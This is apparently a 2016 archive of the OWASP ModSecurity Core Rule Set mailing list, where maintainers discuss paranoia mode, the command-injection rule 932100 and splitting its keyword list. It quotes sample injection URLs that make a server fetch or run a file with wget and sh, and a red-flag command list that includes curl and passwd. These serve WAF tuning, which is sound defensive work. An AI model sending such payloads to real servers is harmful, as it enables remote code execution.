> >> >>>their setup rule immediately, or suffer from reduced security. It?s
> >> >>>better to use a scheme that defaults to ?on?. A convention like
> >> >>>?tx.disable_mysql=1? would be user unfriendly and error-prone. But we
> >> >>>could check for an explicit ?off? string, e.g.
> >>?setvar:tx.mysql=off?. If
> >> >>>it?s not ?off? then assume that the user DOES want the check. I think
> >> >>>it?s important to get this right in 3.0.0, it will be more painful
> >>to do
> >> >>>it later.)
> >> >>>
> >> >>> That's a very good observation. I had a similar idea once.
> >> >>>
> >> >>> In programming, you usually start with a default value and then
> >> >>> the users overrides the default value. If he wants to.
> >> >>>
> >> >>> I am not sure how modsecurity_crs_10_setup.conf.example is going to
> >> >>> be transformed to work seamlessly with 3.0. But this makes the
> >> >>> setting of default values a bit tricky.
> >> >>>
> >> >>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
> >> >>> if certain variables are not set.
> >> >>>
> >> >>> > 2) Separate the words into multiple lists:
> >> >>> >    os-commands-critical.data (absolute red flag list: "curl",
> >>"passwd",
> >> >>>"sh", "uname", "wget" etc.)
> >> >>> >    os-commands-paranoid.data (absolute low value, but high FP
> >>natural
> >> >>>words like "choice")
> >> >>> >    os-commands-windows.data (all Windows commands)
> >> >>> >    os-commands-common.data (all other commands)
> >> >>>
> >> >>> Makes some sense. Too granular is difficult and you mix various
> >> >>> grouping criteria (criticality, paranoia, os), which makes is a
> >> >>> bit hard to follow.
> >> >>>
> >> >>> Other opinions?
> >> >>>
> >> >>> > 3) Review the current regexp against some test data and CRSv2 to
> >>make
> >> >>>it more sensitive
> >> >>>
> >> >>> Good plan. Maybe this could be done in a separate pull request.
> >> >>> I am afraid to overload the paranoia mode pull request...
> >> >>>
> >> >>> Ahoj,
> >> >>>
> >> >>> Christian
> >> >>>
> >> >>>
> >> >>> --
> >> >>> In war you will generally find that the enemy has at any time
> >> >>> three courses of action open to him. Of those three, he will
> >> >>> invariably choose the fourth.
> >> >>> -- Helmuth Von Moltke
> >> >>> _______________________________________________
> >> >>> Owasp-modsecurity-core-rule-set mailing list
> >> >>> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >>>
> >>
> >>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0me
> >>>>>OIn
> >>
> >>>>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo
> >>>>>%2f
> >> >>>owasp-modsecurity-core-rule-set
> >> >>
> >> >>--
> >> >>mailto:christian.folini at netnea.com
> >>
> >>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meO
> >>>>Inu
> >> >>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >> >>twitter: @ChrFolini
> >> >>_______________________________________________
> >> >>Owasp-modsecurity-core-rule-set mailing list
> >> >>Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>
> >>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0meO
> >>>>Inu
> >>
> >>>>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2
> >>>>fow
> >> >>asp-modsecurity-core-rule-set
> >> >
> >> >
> >> > ________________________________
> >> >
> >> > This transmission may contain information that is privileged,
> >>confidential, and/or exempt from disclosure under applicable law. If you
> >>are not the intended recipient, you are hereby notified that any
> >>disclosure, copying, distribution, or use of the information contained
> >>herein (including any reliance thereon) is strictly prohibited. If you
> >>received this transmission in error, please immediately contact the
> >>sender and destroy the material in its entirety, whether in electronic
> >>or hard copy format.
> >> > _______________________________________________
> >> > Owasp-modsecurity-core-rule-set mailing list
> >> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >
> >>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmK
> >>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>owasp-modsecurity-core-rule-set
> >> _______________________________________________
> >> Owasp-modsecurity-core-rule-set mailing list
> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >>
> >>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmK
> >>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
> >>owasp-modsecurity-core-rule-set
> >
> >--
> >mailto:christian.folini at netnea.com
> >http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmKE
> >YIczjUmg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> >twitter: @ChrFolini
> >_______________________________________________
> >Owasp-modsecurity-core-rule-set mailing list
> >Owasp-modsecurity-core-rule-set at lists.owasp.org
> >http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXmKE
> >NdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> >asp-modsecurity-core-rule-set
> 
> 
> ________________________________
> 
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 22 19:49:13 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 22 Feb 2016 19:49:13 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160222194733.GC25903@elias>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
	<CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
	<20160218094929.GA4093@elias> <D2F08827.1A882%csanders@trustwave.com>
	<20160222194733.GC25903@elias>
Message-ID: <D2F0D05C.1A8F1%csanders@trustwave.com>

Hey christian,
I added a v3.0.0-rc1 development tag. Do you want a special v3.0.0-rc1
Paranoid tag?

On 2/22/16, 2:47 PM, "Christian Folini" <christian.folini at netnea.com>
wrote:

>Chaim,
>
>That issues idea makes sense. I second that.
>
>Cheers,
>
>Christian
>
>On Mon, Feb 22, 2016 at 02:41:38PM +0000, Chaim Sanders wrote:
>> I think a todo file or issues in the github are in order. I?m more in
>> favor of the second. I can make a custom label for each specific area if
>> we need. I think that will perform better because we can assign things
>>and
>> track people progress etc. thoughts?
>>
>> On 2/18/16, 4:49 AM,
>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> Christian Folini"
>><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> on behalf of christian.folini at netnea.com> wrote:
>>
>> >Hello,
>> >
>> >That is a smart move. It allows us to eliminate all "file splitting"
>> >tasks out of the paranoia mode project. Simplifies things a lot.
>> >
>> >@Chaim want to start a TODO file in the top folder of the CRS?
>> >
>> >Ahoj,
>> >
>> >Christian
>> >
>> >On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
>> >> Hi,
>> >>
>> >> I also like the idea of splitting the file. Perhaps we even need
>> >>multiple files.
>> >> Walter has a lot of good thougts!
>> >> This task doesn't seem to be very easy and some testing will be
>> >>necessary.
>> >> So I think we have to decide later, outside of this little project,
>> >> and we should move on to the first pull request.
>> >>
>> >> Regards,
>> >> Franziska
>> >>
>> >> 2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
>> >> > For the record I think this is a good idea but perhaps outside the
>> >>scope a
>> >> > bit of the initial RC release. Christian, I suggest we add this to
>>the
>> >> > To-do for 3.1. Thoughts?
>> >> >
>> >> > On 2/12/16, 4:17 PM,
>> >> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf
>>of
>> >> > Christian Folini"
>> >><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
>> >> > on behalf of christian.folini at netnea.com> wrote:
>> >> >
>> >> >>Hi there,
>> >> >>
>> >> >>There has not been any additional feedback in this thread, but I
>>think
>> >> >>the question is not settled as of this writing.
>> >> >>
>> >> >>Thoughts?
>> >> >>
>> >> >>Regs,
>> >> >>
>> >> >>Christian
>> >> >>
>> >> >>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
>> >> >>> Hi there,
>> >> >>>
>> >> >>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
>> >> >>> > I like the idea of splitting the file.
>> >> >>>
>> >> >>> Cool.
>> >> >>>
>> >> >>> > I agree some of the words in os-commands.data seem rather
>> >>paranoid.
>> >> >>>Words like "choice", "help", "now? seem of low value and are
>>common
>> >>in
>> >> >>>natural text. Also, the large number of Unix-only environments
>>could
>> >> >>>skip Windows related commands. It?s hard for users to modify these
>> >>lists
>> >> >>>as you?d have to hack the CRS, and these huge collections are to
>> >> >>>maintain anyhow, so I agree we need granularity.
>> >> >>>
>> >> >>> Good point.
>> >> >>>
>> >> >>> > The rule has some regexp magic to prevent false positives, but
>>the
>> >> >>>balance is not a complete success in my opinion. For instance, the
>> >> >>>following URLs don't trigger in CRSv3:
>> >> >>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
>> >> >>> > http://vuln/?cmd=sh%20blah.txt
>> >> >>> >
>> >> >>> > So it's not as strong as you would want either to prevent some
>> >>common
>> >> >>>RCE.
>> >> >>> > Something like
>>http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
>> >> >>>does trigger it.
>> >> >>>
>> >> >>> I see. Good observations.
>> >> >>>
>> >> >>> > 1) I think that a user should check their desired platforms in
>>the
>> >> >>>setup conf. In fact, this would be great to do anyway in the
>>initial
>> >> >>>3.0.0 release even if we DON'T look at it in any rule yet.
>>Specifying
>> >> >>>platform types will pave the way for reducing false positives and
>> >>false
>> >> >>>negatives by skipping unnecessary checks and being more strict on
>>the
>> >> >>>right platforms. So we could start by listing these platforms in
>>the
>> >> >>>existing rule in the setup conf. Example:
>> >> >>> >
>> >> >>> >    SecAction \
>> >> >>> >      "id:'900024', \
>> >> >>> >      phase:1, \
>> >> >>> >      t:none, \
>> >> >>> >      setvar:tx.unix=1, \
>> >> >>> >      setvar:tx.windows=1, \
>> >> >>> >      setvar:tx.java=1, \
>> >> >>> >      setvar:tx.php=1, \
>> >> >>>
>> >> >>> That makes a lot of sense. At first sight.
>> >> >>>
>> >> >>> I think that a default install should come with these rulesets
>> >> >>> all enabled and a sysadmin can then switch them of if we is aware
>> >>that
>> >> >>> there is no php in his service.
>> >> >>>
>> >> >>> So given the following two scenarios
>> >> >>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
>> >> >>>positives
>> >> >>>     because he does not disable unneeded rulesets
>> >> >>> #2 - Newbie sysadmin installs ModSec and is p0wned because he
>>does
>> >>not
>> >> >>>enable
>> >> >>>     the php protection
>> >> >>> I strongly favour #1.
>> >> >>>
>> >> >>> A vanilla install of the core rules should give you a full
>>coverage
>> >>for
>> >> >>>all
>> >> >>> types of services and a decent security level. Reducing false
>> >>positives
>> >> >>>by
>> >> >>> omitting certain rules (ideally rules which provide no value for
>> >>your
>> >> >>>setup)
>> >> >>> is the very idea of tuning.
>> >> >>> Reducing the initial number of false positives by moving certain
>> >>rules
>> >> >>> with a worse relationsship between added security and false
>> >>positives,
>> >> >>> that is the idea of the paranoia mode.
>> >> >>>
>> >> >>> Chaim stated in a different message, that the rules are now
>> >>organised
>> >> >>> into files aimed at certain environments. So switching them off
>>is
>> >> >>> fairly easy. And there are the tags on top of it.
>> >> >>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag
>>will
>> >> >>> disable them all very easily.
>> >> >>>
>> >> >>> So I think, we do not need these variables.
>> >> >>>
>> >> >>> > (By the way: I think it?s unfortunate that a user has to use
>> >>value 1
>> >> >>>to enable a check. An undefined variable will mean that the CRS
>>will
>> >> >>>skip some rules. This makes it dangerous to introduce a new
>>variable
>> >>in
>> >> >>>the CRS later; all existing installations MUST then add this
>> >>variable to
>> >> >>>their setup rule immediately, or suffer from reduced security.
>>It?s
>> >> >>>better to use a scheme that defaults to ?on?. A convention like
>> >> >>>?tx.disable_mysql=1? would be user unfriendly and error-prone.
>>But we
>> >> >>>could check for an explicit ?off? string, e.g.
>> >>?setvar:tx.mysql=off?. If
>> >> >>>it?s not ?off? then assume that the user DOES want the check. I
>>think
>> >> >>>it?s important to get this right in 3.0.0, it will be more painful
>> >>to do
>> >> >>>it later.)
>> >> >>>
>> >> >>> That's a very good observation. I had a similar idea once.
>> >> >>>
>> >> >>> In programming, you usually start with a default value and then
>> >> >>> the users overrides the default value. If he wants to.
>> >> >>>
>> >> >>> I am not sure how modsecurity_crs_10_setup.conf.example is going
>>to
>> >> >>> be transformed to work seamlessly with 3.0. But this makes the
>> >> >>> setting of default values a bit tricky.
>> >> >>>
>> >> >>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
>> >> >>> if certain variables are not set.
>> >> >>>
>> >> >>> > 2) Separate the words into multiple lists:
>> >> >>> >    os-commands-critical.data (absolute red flag list: "curl",
>> >>"passwd",
>> >> >>>"sh", "uname", "wget" etc.)
>> >> >>> >    os-commands-paranoid.data (absolute low value, but high FP
>> >>natural
>> >> >>>words like "choice")
>> >> >>> >    os-commands-windows.data (all Windows commands)
>> >> >>> >    os-commands-common.data (all other commands)
>> >> >>>
>> >> >>> Makes some sense. Too granular is difficult and you mix various
>> >> >>> grouping criteria (criticality, paranoia, os), which makes is a
>> >> >>> bit hard to follow.
>> >> >>>
>> >> >>> Other opinions?
>> >> >>>
>> >> >>> > 3) Review the current regexp against some test data and CRSv2
>>to
>> >>make
>> >> >>>it more sensitive
>> >> >>>
>> >> >>> Good plan. Maybe this could be done in a separate pull request.
>> >> >>> I am afraid to overload the paranoia mode pull request...
>> >> >>>
>> >> >>> Ahoj,
>> >> >>>
>> >> >>> Christian
>> >> >>>
>> >> >>>
>> >> >>> --
>> >> >>> In war you will generally find that the enemy has at any time
>> >> >>> three courses of action open to him. Of those three, he will
>> >> >>> invariably choose the fourth.
>> >> >>> -- Helmuth Von Moltke
>> >> >>> _______________________________________________
>> >> >>> Owasp-modsecurity-core-rule-set mailing list
>> >> >>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >> >>>
>> >>
>>
>>>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0
>>>>>>>me
>> >>>>>OIn
>> >>
>>
>>>>>>>uYrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistin
>>>>>>>fo
>> >>>>>%2f
>> >> >>>owasp-modsecurity-core-rule-set
>> >> >>
>> >> >>--
>> >> >>mailto:christian.folini at netnea.com
>> >>
>>
>>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m
>>>>>>eO
>> >>>>Inu
>> >> >>N-aaCptw&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> >> >>twitter: @ChrFolini
>> >> >>_______________________________________________
>> >> >>Owasp-modsecurity-core-rule-set mailing list
>> >> >>Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >>
>>
>>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m
>>>>>>eO
>> >>>>Inu
>> >>
>>
>>>>>>YrNabyug&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo
>>>>>>%2
>> >>>>fow
>> >> >>asp-modsecurity-core-rule-set
>> >> >
>> >> >
>> >> > ________________________________
>> >> >
>> >> > This transmission may contain information that is privileged,
>> >>confidential, and/or exempt from disclosure under applicable law. If
>>you
>> >>are not the intended recipient, you are hereby notified that any
>> >>disclosure, copying, distribution, or use of the information contained
>> >>herein (including any reliance thereon) is strictly prohibited. If you
>> >>received this transmission in error, please immediately contact the
>> >>sender and destroy the material in its entirety, whether in electronic
>> >>or hard copy format.
>> >> > _______________________________________________
>> >> > Owasp-modsecurity-core-rule-set mailing list
>> >> > Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >> >
>>
>>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX
>>>>mK
>>
>>>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>>2f
>> >>owasp-modsecurity-core-rule-set
>> >> _______________________________________________
>> >> Owasp-modsecurity-core-rule-set mailing list
>> >> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> >>
>>
>>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyX
>>>>mK
>>
>>>>ENdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
>>>>2f
>> >>owasp-modsecurity-core-rule-set
>> >
>> >--
>> >mailto:christian.folini at netnea.com
>>
>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm
>>>KE
>> >YIczjUmg&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
>> >twitter: @ChrFolini
>> >_______________________________________________
>> >Owasp-modsecurity-core-rule-set mailing list
>> >Owasp-modsecurity-core-rule-set at lists.owasp.org
>>
>>>http://scanmail.trustwave.com/?c=4062&d=oprF1pAS3K8GsgJkttF2b76CyDjqyyXm
>>>KE
>>
>>>NdLz6Plw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
>>>ow
>> >asp-modsecurity-core-rule-set
>>
>>
>> ________________________________
>>
>> This transmission may contain information that is privileged,
>>confidential, and/or exempt from disclosure under applicable law. If you
>>are not the intended recipient, you are hereby notified that any
>>disclosure, copying, distribution, or use of the information contained
>>herein (including any reliance thereon) is strictly prohibited. If you
>>received this transmission in error, please immediately contact the
>>sender and destroy the material in its entirety, whether in electronic
>>or hard copy format.


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From christian.folini at netnea.com  Mon Feb 22 19:50:04 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 20:50:04 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial ...
In-Reply-To: <D2F07947.1A83E%csanders@trustwave.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<20160218075309.GA10110@elias> <20160218093020.GA3449@elias>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A9B5@A1GTOEMBXV001.gto.a3c.atos.net>
	<20160218100305.GA4569@elias>
	<D2F07947.1A83E%csanders@trustwave.com>
Message-ID: <20160222195004.GD25903@elias>

On Mon, Feb 22, 2016 at 01:39:20PM +0000, Chaim Sanders wrote:
> I have also merged your changes

Thank you Chaim. Glad this geoip blocking works again. I used
to have my own rules for this functionality. Maybe because I
could not get the CRS geoip blocking to work properly. :)

Christian


-- 
The need for mystery is greater than the need for an answer.
--- Ken Kesey

From christian.folini at netnea.com  Mon Feb 22 19:53:50 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 22 Feb 2016 20:53:50 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <D2F0D05C.1A8F1%csanders@trustwave.com>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
	<CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>
	<20160218094929.GA4093@elias>
	<D2F08827.1A882%csanders@trustwave.com>
	<20160222194733.GC25903@elias>
	<D2F0D05C.1A8F1%csanders@trustwave.com>
Message-ID: <20160222195350.GA26526@elias>

On Mon, Feb 22, 2016 at 07:49:13PM +0000, Chaim Sanders wrote:
> Hey christian,
> I added a v3.0.0-rc1 development tag. Do you want a special v3.0.0-rc1
> Paranoid tag?

Sure, why not. Might come in handy.

Christian

> 
> On 2/22/16, 2:47 PM, "Christian Folini" <christian.folini at netnea.com>
> wrote:
> 
> >Chaim,
> >
> >That issues idea makes sense. I second that.
> >
> >Cheers,
> >
> >Christian
> >
> >On Mon, Feb 22, 2016 at 02:41:38PM +0000, Chaim Sanders wrote:
> >> I think a todo file or issues in the github are in order. I?m more in
> >> favor of the second. I can make a custom label for each specific area if
> >> we need. I think that will perform better because we can assign things
> >>and
> >> track people progress etc. thoughts?
> >>
> >> On 2/18/16, 4:49 AM,
> >> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> >> Christian Folini"
> >><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> >> on behalf of christian.folini at netnea.com> wrote:
> >>
> >> >Hello,
> >> >
> >> >That is a smart move. It allows us to eliminate all "file splitting"
> >> >tasks out of the paranoia mode project. Simplifies things a lot.
> >> >
> >> >@Chaim want to start a TODO file in the top folder of the CRS?
> >> >
> >> >Ahoj,
> >> >
> >> >Christian
> >> >
> >> >On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
> >> >> Hi,
> >> >>
> >> >> I also like the idea of splitting the file. Perhaps we even need
> >> >>multiple files.
> >> >> Walter has a lot of good thougts!
> >> >> This task doesn't seem to be very easy and some testing will be
> >> >>necessary.
> >> >> So I think we have to decide later, outside of this little project,
> >> >> and we should move on to the first pull request.
> >> >>
> >> >> Regards,
> >> >> Franziska
> >> >>
> >> >> 2016-02-15 5:07 GMT+01:00 Chaim Sanders <CSanders at trustwave.com>:
> >> >> > For the record I think this is a good idea but perhaps outside the
> >> >>scope a
> >> >> > bit of the initial RC release. Christian, I suggest we add this to
> >>the
> >> >> > To-do for 3.1. Thoughts?
> >> >> >
> >> >> > On 2/12/16, 4:17 PM,
> >> >> > "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf
> >>of
> >> >> > Christian Folini"
> >> >><owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> >> >> > on behalf of christian.folini at netnea.com> wrote:
> >> >> >
> >> >> >>Hi there,
> >> >> >>
> >> >> >>There has not been any additional feedback in this thread, but I
> >>think
> >> >> >>the question is not settled as of this writing.
> >> >> >>
> >> >> >>Thoughts?
> >> >> >>
> >> >> >>Regs,
> >> >> >>
> >> >> >>Christian
> >> >> >>
> >> >> >>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
> >> >> >>> Hi there,
> >> >> >>>
> >> >> >>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
> >> >> >>> > I like the idea of splitting the file.
> >> >> >>>
> >> >> >>> Cool.
> >> >> >>>
> >> >> >>> > I agree some of the words in os-commands.data seem rather
> >> >>paranoid.
> >> >> >>>Words like "choice", "help", "now? seem of low value and are
> >>common
> >> >>in
> >> >> >>>natural text. Also, the large number of Unix-only environments
> >>could
> >> >> >>>skip Windows related commands. It?s hard for users to modify these
> >> >>lists
> >> >> >>>as you?d have to hack the CRS, and these huge collections are to
> >> >> >>>maintain anyhow, so I agree we need granularity.
> >> >> >>>
> >> >> >>> Good point.
> >> >> >>>
> >> >> >>> > The rule has some regexp magic to prevent false positives, but
> >>the
> >> >> >>>balance is not a complete success in my opinion. For instance, the
> >> >> >>>following URLs don't trigger in CRSv3:
> >> >> >>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
> >> >> >>> > http://vuln/?cmd=sh%20blah.txt
> >> >> >>> >
> >> >> >>> > So it's not as strong as you would want either to prevent some
> >> >>common
> >> >> >>>RCE.
> >> >> >>> > Something like
> >>http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
> >> >> >>>does trigger it.
> >> >> >>>
> >> >> >>> I see. Good observations.
> >> >> >>>
> >> >> >>> > 1) I think that a user should check their desired platforms in
> >>the
> >> >> >>>setup conf. In fact, this would be great to do anyway in the
> >>initial
> >> >> >>>3.0.0 release even if we DON'T look at it in any rule yet.
> >>Specifying
> >> >> >>>platform types will pave the way for reducing false positives and
> >> >>false
> >> >> >>>negatives by skipping unnecessary checks and being more strict on
> >>the
> >> >> >>>right platforms. So we could start by listing these platforms in
> >>the
> >> >> >>>existing rule in the setup conf. Example:
> >> >> >>> >
> >> >> >>> >    SecAction \
> >> >> >>> >      "id:'900024', \
> >> >> >>> >      phase:1, \
> >> >> >>> >      t:none, \
> >> >> >>> >      setvar:tx.unix=1, \
> >> >> >>> >      setvar:tx.windows=1, \
> >> >> >>> >      setvar:tx.java=1, \
> >> >> >>> >      setvar:tx.php=1, \
> >> >> >>>
> >> >> >>> That makes a lot of sense. At first sight.
> >> >> >>>
> >> >> >>> I think that a default install should come with these rulesets
> >> >> >>> all enabled and a sysadmin can then switch them of if we is aware
> >> >>that
> >> >> >>> there is no php in his service.
> >> >> >>>
> >> >> >>> So given the following two scenarios
> >> >> >>> #1 - Newbie sysadmin installs ModSec and runs into a lot of false
> >> >> >>>positives
> >> >> >>>     because he does not disable unneeded rulesets
> >> >> >>> #2 - Newbie sysadmin installs ModSec and is p0wned because he
> >>does
> >> >>not
> >> >> >>>enable
> >> >> >>>     the php protection
> >> >> >>> I strongly favour #1.
> >> >> >>>
> >> >> >>> A vanilla install of the core rules should give you a full
> >>coverage
> >> >>for
> >> >> >>>all
> >> >> >>> types of services and a decent security level. Reducing false
> >> >>positives
> >> >> >>>by
> >> >> >>> omitting certain rules (ideally rules which provide no value for
> >> >>your
> >> >> >>>setup)
> >> >> >>> is the very idea of tuning.
> >> >> >>> Reducing the initial number of false positives by moving certain
> >> >>rules
> >> >> >>> with a worse relationsship between added security and false
> >> >>positives,
> >> >> >>> that is the idea of the paranoia mode.
> >> >> >>>
> >> >> >>> Chaim stated in a different message, that the rules are now
> >> >>organised
> >> >> >>> into files aimed at certain environments. So switching them off
> >>is
> >> >> >>> fairly easy. And there are the tags on top of it.
> >> >> >>> So you have tag:'language-PHP' and setting SecRuleRemoveByTag
> >>will
> >> >> >>> disable them all very easily.
> >> >> >>>
> >> >> >>> So I think, we do not need these variables.
> >> >> >>>
> >> >> >>> > (By the way: I think it?s unfortunate that a user has to use
> >> >>value 1
> >> >> >>>to enable a check. An undefined variable will mean that the CRS
> >>will
> >> >> >>>skip some rules. This makes it dangerous to introduce a new
> >>variable
> >> >>in
> >> >> >>>the CRS later; all existing installations MUST then add this
> >> >>variable to
> >> >> >>>their setup rule immediately, or suffer from reduced security.
> >>It?s
> >> >> >>>better to use a scheme that defaults to ?on?. A convention like
> >> >> >>>?tx.disable_mysql=1? would be user unfriendly and error-prone.
> >>But we
> >> >> >>>could check for an explicit ?off? string, e.g.
> >> >>?setvar:tx.mysql=off?. If
> >> >> >>>it?s not ?off? then assume that the user DOES want the check. I
> >>think
> >> >> >>>it?s important to get this right in 3.0.0, it will be more painful
> >> >>to do
> >> >> >>>it later.)
> >> >> >>>
> >> >> >>> That's a very good observation. I had a similar idea once.
> >> >> >>>
> >> >> >>> In programming, you usually start with a default value and then
> >> >> >>> the users overrides the default value. If he wants to.
> >> >> >>>
> >> >> >>> I am not sure how modsecurity_crs_10_setup.conf.example is going
> >>to
> >> >> >>> be transformed to work seamlessly with 3.0. But this makes the
> >> >> >>> setting of default values a bit tricky.
> >> >> >>>
> >> >> >>> Maybe a file REQUEST-02-DEFAULTS.conf could set default values
> >> >> >>> if certain variables are not set.
> >> >> >>>
> >> >> >>> > 2) Separate the words into multiple lists:
> >> >> >>> >    os-commands-critical.data (absolute red flag list: "curl",
> >> >>"passwd",
> >> >> >>>"sh", "uname", "wget" etc.)
> >> >> >>> >    os-commands-paranoid.data (absolute low value, but high FP
> >> >>natural
> >> >> >>>words like "choice")
> >> >> >>> >    os-commands-windows.data (all Windows commands)
> >> >> >>> >    os-commands-common.data (all other commands)
> >> >> >>>
> >> >> >>> Makes some sense. Too granular is difficult and you mix various
> >> >> >>> grouping criteria (criticality, paranoia, os), which makes is a
> >> >> >>> bit hard to follow.
> >> >> >>>
> >> >> >>> Other opinions?
> >> >> >>>
> >> >> >>> > 3) Review the current regexp against some test data and CRSv2
> >>to
> >> >>make
> >> >> >>>it more sensitive
> >> >> >>>
> >> >> >>> Good plan. Maybe this could be done in a separate pull request.
> >> >> >>> I am afraid to overload the paranoia mode pull request...
> >> >> >>>
> >> >> >>> Ahoj,
> >> >> >>>
> >> >> >>> Christian
> >> >> >>>
> >> >> >>>
> >> >> >>> --
> >> >> >>> In war you will generally find that the enemy has at any time
> >> >> >>> three courses of action open to him. Of those three, he will
> >> >> >>> invariably choose the fourth.
> >> >> >>> -- Helmuth Von Moltke
> >> >> >>> _______________________________________________
> >> >> >>> Owasp-modsecurity-core-rule-set mailing list
> >> >> >>> Owasp-modsecurity-core-rule-set at lists.owasp.org
> >> >> >>>
> >> >>
> >>
> >>>>>>>http://scanmail.trustwave.com/?c=4062&d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0
> >>>>>>>me
> >> >>>>>OIn
> >> >>
> >>
